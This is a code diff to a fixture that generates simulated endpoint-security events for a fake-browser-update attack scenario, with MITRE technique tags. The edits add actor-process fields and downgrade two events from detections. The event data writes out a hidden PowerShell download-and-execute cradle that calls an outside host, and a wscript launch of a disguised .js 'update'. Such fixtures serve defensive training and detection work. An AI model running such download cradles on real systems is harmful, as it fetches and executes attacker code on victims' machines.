@@ -85,6 +85,7 @@ export function fakeBrowserUpdateScenarioEvents() {
     csFile({
       ...cs, id: "evt_fbu_04_file_write", ts: T(3 * MIN + 44_000),
       path: "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js", sha256: scriptHash, severity: "low",
+      actorProcess: "chrome.exe", actorPath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", actorParentName: "explorer.exe",
       description: "chrome.exe wrote C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js to disk.",
     }),
 
@@ -94,7 +95,10 @@ export function fakeBrowserUpdateScenarioEvents() {
       processName: "wscript.exe", pid: 9312, processPath: "C:\\Windows\\System32\\wscript.exe",
       cmdline: 'wscript.exe "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js"',
       parentName: "explorer.exe", parentPid: 3560, sha256: wscriptHash, signed: true,
-      mitre: "T1204.002", tactic: "Execution", severity: "high", isDetection: true,
+      mitre: "T1204.002", tactic: "Execution", severity: "high",
+      // Process Creation (not a detection), so the .js command-line argument is visible as
+      // evidence and the agent shows one mitigation mode across the story (the only
+      // detection is the Falcon alert at step 8).
       description: "explorer.exe started wscript.exe with the downloaded .js file as its argument.",
     }),
 
@@ -104,7 +108,8 @@ export function fakeBrowserUpdateScenarioEvents() {
       processName: "powershell.exe", pid: 9388, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmdline: "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://api-telemetry-sync.com/s/2')\"",
       parentName: "wscript.exe", parentPid: 9312, sha256: powershellHash, signed: true,
-      mitre: "T1059.001", tactic: "Execution", severity: "critical", isDetection: true,
+      mitre: "T1059.001", tactic: "Execution", severity: "critical",
+      // Process Creation (not a detection) — the download-cradle command line is the evidence.
       description: "wscript.exe spawned powershell.exe with a download-and-run command line pointing at api-telemetry-sync.com.",
     }),
 
